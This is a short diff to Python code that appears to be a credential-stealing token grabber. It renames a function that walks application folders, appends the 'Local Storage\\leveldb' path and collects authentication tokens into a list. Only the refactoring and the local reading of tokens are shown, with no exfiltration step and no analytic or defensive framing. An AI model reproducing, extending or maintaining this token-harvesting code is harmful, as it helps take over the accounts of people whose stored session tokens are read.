@@ -21,7 +21,7 @@ def findTokens():
         if not os.path.exists(path):
             continue
 
-        tokens = find_tokens(path)
+        tokens = extract_tokens(path)
 
         for token in tokens:
             tokenList.append(token)
@@ -29,7 +29,7 @@ def findTokens():
     return tokenList
 
 
-def find_tokens(path):
+def extract_tokens(path):
     path += '\\Local Storage\\leveldb'
 
     tokens = []
